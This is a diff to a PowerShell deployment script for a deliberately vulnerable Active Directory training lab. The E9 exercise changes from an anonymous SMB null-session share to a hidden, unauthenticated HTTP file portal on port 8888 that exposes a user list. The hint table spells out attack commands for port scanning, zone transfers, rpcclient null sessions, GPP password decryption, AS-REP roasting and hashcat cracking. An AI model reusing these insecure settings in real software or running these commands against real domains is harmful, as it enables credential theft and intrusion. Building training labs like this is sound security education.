@@ -720,37 +720,68 @@ function Deploy-Lab-E9 {
 "@ | Set-Content "$sharePath\staff_directory.txt" -Encoding UTF8
     $displayList | Sort-Object | Add-Content "$sharePath\staff_directory.txt"
 
-    # ── Expose the share via null session (3 layers required on WS 2019/2022) ──
+    # ── Spin up a lightweight HTTP listener (unauthenticated) on port 8888 ──────
+    # Simulates an exposed internal file portal (HR portal, internal wiki, etc.).
+    # This approach is used instead of SMB null sessions because Windows Server 2022
+    # enforces SMB signing at the transport layer - no registry setting can override
+    # it for unauthenticated connections. HTTP has no such restriction.
+    $listenerScript = @'
+$http = New-Object System.Net.HttpListener
+$http.Prefixes.Add("http://+:8888/")
+$http.Start()
+while ($http.IsListening) {
+    try {
+        $ctx  = $http.GetContext()
+        $req  = $ctx.Request
+        $resp = $ctx.Response
+        $rel  = $req.Url.LocalPath.TrimStart("/")
+        $root = "C:\ADPLab_Staff"
+        if ($rel -eq "" -or $rel -eq "/") {
+            $files = Get-ChildItem $root -File | Select-Object -ExpandProperty Name
+            $html  = "<html><body style='font-family:monospace;padding:20px'>"
+            $html += "<h2>SecOps Corp - Staff Portal</h2><p>INTERNAL USE ONLY</p><ul>"
+            foreach ($f in $files) { $html += "<li><a href='/$f'>$f</a></li>" }
+            $html += "</ul></body></html>"
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($html)
+            $resp.ContentType = "text/html"
+            $resp.ContentLength64 = $bytes.Length
+            $resp.OutputStream.Write($bytes, 0, $bytes.Length)
+        } else {
+            $fp = Join-Path $root $rel
+            if (Test-Path $fp -PathType Leaf) {
+                $bytes = [System.IO.File]::ReadAllBytes($fp)
+                $resp.ContentLength64 = $bytes.Length
+                $resp.OutputStream.Write($bytes, 0, $bytes.Length)
+            } else {
+                $resp.StatusCode = 404
+                $errBytes = [System.Text.Encoding]::UTF8.GetBytes("Not found")
+                $resp.ContentLength64 = $errBytes.Length
+                $resp.OutputStream.Write($errBytes, 0, $errBytes.Length)
+            }
+        }
+        $resp.OutputStream.Close()
+    } catch {}
+}
+'@
+    $listenerScript | Set-Content "C:\ADPLab_Staff\.http_listener.ps1" -Encoding UTF8
 
-    # Layer 1: Create the SMB share open to Everyone
-    New-SmbShare -Name "Staff" -Path $sharePath -FullAccess "Everyone" -ErrorAction SilentlyContinue
+    # Open firewall port 8888 inbound
+    netsh advfirewall firewall delete rule name="ADPLab-E9-HTTP" | Out-Null
+    netsh advfirewall firewall add rule name="ADPLab-E9-HTTP" dir=in action=allow protocol=TCP localport=8888 | Out-Null
 
-    # Layer 2: Allow null session access to the server
-    $lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
-    Set-ItemProperty -Path $lsaPath -Name "RestrictNullSessAccess" -Value 0 -ErrorAction SilentlyContinue
+    # Launch as a detached hidden process so it survives past this PS session
+    $proc = Start-Process powershell.exe `
+        -ArgumentList "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"C:\ADPLab_Staff\.http_listener.ps1`"" `
+        -PassThru
+    $proc.Id | Set-Content "C:\ADPLab_Staff\.http_pid" -Encoding UTF8
 
-    # Layer 3: Explicitly register share in NullSessionShares so SMB2 permits it
-    # (On WS 2019/2022 this is required - registry change alone is not enough)
-    $existing = (Get-ItemProperty -Path $lsaPath -Name "NullSessionShares" -ErrorAction SilentlyContinue).NullSessionShares
-    if ($existing -notcontains "Staff") {
-        $updated = @($existing) + "Staff" | Where-Object { $_ }
-        Set-ItemProperty -Path $lsaPath -Name "NullSessionShares" -Value $updated -ErrorAction SilentlyContinue
-    }
-
-    # Layer 4: Also allow anonymous LSA access for share enumeration
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymous"    -Value 0 -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymousSAM" -Value 0 -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "EveryoneIncludesAnonymous" -Value 1 -ErrorAction SilentlyContinue
-
-    # Layer 5: Restart LanmanServer so all registry changes take effect immediately
-    Write-Status "Restarting LanmanServer to apply null session config..." WORK
-    Restart-Service LanmanServer -Force -ErrorAction SilentlyContinue
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 2
 
     Add-ActiveLab "E9-User-Enum"
     Write-Status "Lab E9 deployed. 5 users added; jsmith + mjohnson have pre-auth disabled." OK
-    Write-Status "Staff share planted: \\$($env:COMPUTERNAME)\Staff  (null session readable)" OK
-    Write-Status "Enumerate with: smbclient -L //[DC_IP]/ -N  or  enum4linux -a [DC_IP]" INFO
+    Write-Status "HTTP staff portal live: http://$($env:COMPUTERNAME):8888/" OK
+    Write-Status "Grab user list : curl http://[DC_IP]:8888/users.txt -o users.txt" INFO
+    Write-Status "Then AS-REP    : GetNPUsers.py [domain]/ -dc-ip [DC_IP] -no-pass -usersfile users.txt -format hashcat" INFO
 }
 
 function Teardown-Lab-E9 {
@@ -758,21 +789,20 @@ function Teardown-Lab-E9 {
     foreach ($u in $users) {
         Remove-ADUser -Identity $u -Confirm:$false -ErrorAction SilentlyContinue
     }
-    Remove-SmbShare -Name "Staff" -Force -ErrorAction SilentlyContinue
-    Remove-Item -Recurse -Force "C:\ADPLab_Staff" -ErrorAction SilentlyContinue
 
-    # Restore null session restrictions
-    $lsaPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
-    Set-ItemProperty -Path $lsaPath -Name "RestrictNullSessAccess" -Value 1 -ErrorAction SilentlyContinue
-    $existing = (Get-ItemProperty -Path $lsaPath -Name "NullSessionShares" -ErrorAction SilentlyContinue).NullSessionShares
-    if ($existing) {
-        $updated = $existing | Where-Object { $_ -ne "Staff" }
-        Set-ItemProperty -Path $lsaPath -Name "NullSessionShares" -Value $updated -ErrorAction SilentlyContinue
+    # Stop the HTTP listener process - try saved PID first, then fall back to port scan
+    $pidFile = "C:\ADPLab_Staff\.http_pid"
+    if (Test-Path $pidFile) {
+        $savedPid = [int](Get-Content $pidFile -ErrorAction SilentlyContinue)
+        if ($savedPid) { Stop-Process -Id $savedPid -Force -ErrorAction SilentlyContinue }
     }
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymous"         -Value 1 -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymousSAM"      -Value 1 -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "EveryoneIncludesAnonymous" -Value 0 -ErrorAction SilentlyContinue
-    Restart-Service LanmanServer -Force -ErrorAction SilentlyContinue
+    # Fallback: kill whatever is listening on 8888 (catches orphaned processes)
+    $owningProc = (Get-NetTCPConnection -LocalPort 8888 -State Listen -ErrorAction SilentlyContinue).OwningProcess
+    if ($owningProc) { Stop-Process -Id $owningProc -Force -ErrorAction SilentlyContinue }
+
+    # Remove firewall rule and file directory
+    netsh advfirewall firewall delete rule name="ADPLab-E9-HTTP" | Out-Null
+    Remove-Item -Recurse -Force "C:\ADPLab_Staff" -ErrorAction SilentlyContinue
 
     Remove-ActiveLab "E9-User-Enum"
     Write-Status "Lab E9 cleaned." OK
@@ -1495,7 +1525,7 @@ $Global:LabHints = @{
     "E6"  = @("Test zone transfer: dig axfr [domain] @[DC_IP]","Or: nmap --script dns-zone-transfer -p 53 [DC_IP]","What hostnames are revealed that DNS normally hides?")
     "E7"  = @("Test: rpcclient -U '' -N [DC_IP]","Try enumdomusers, enumdomgroups inside rpcclient","What info can you gather as an anonymous user?")
     "E8"  = @("SYSVOL is readable by all domain users: ls \\[DC]\SYSVOL","Look for Groups.xml or Services.xml files","Decrypt cpassword with gpp-decrypt or Get-GPPPassword")
-    "E9"  = @("Start with share enumeration: crackmapexec smb [DC_IP] -u '' -p '' --shares  or  smbclient -L //[DC_IP]/ -N  -- look for an exposed Staff share","Grab the user list from the share: smbclient //[DC_IP]/Staff -N  then  get users.txt","Feed it into AS-REP roasting: GetNPUsers.py [domain]/ -dc-ip [IP] -no-pass -usersfile users.txt -format hashcat")
+    "E9"  = @("Port scan for unexpected services: nmap -sV -p 8080,8888,8443,9090 [DC_IP]  -- look for an HTTP server on a non-standard port","Browse and download the exposed file portal: curl http://[DC_IP]:8888/  then  curl http://[DC_IP]:8888/users.txt -o users.txt","Feed the list into AS-REP roasting: GetNPUsers.py [domain]/ -dc-ip [DC_IP] -no-pass -usersfile users.txt -format hashcat  then  hashcat -m 18200 hashes.txt rockyou.txt")
     "E10" = @("Enumerate trusts: Get-ADTrust -Filter * or nltest /domain_trusts","PowerView: Get-DomainTrust","What direction is the trust? How can SID history abuse cross it?")
     "C1"  = @("Find targets: GetNPUsers.py [domain]/ -request -no-pass -usersfile users.txt","The hash format is Kerberos 5 AS-REQ Pre-Auth etype 23 (hashcat mode 18200)","Wordlist: rockyou.txt  -  these passwords are intentionally weak")
     "C2"  = @("Request TGS: GetUserSPNs.py [domain]/[user]:[pwd] -request -dc-ip [IP]","Crack with hashcat -m 13100 (Kerberos 5 TGS-REP etype 23)","Which service accounts have weak passwords? Try common service passwords")
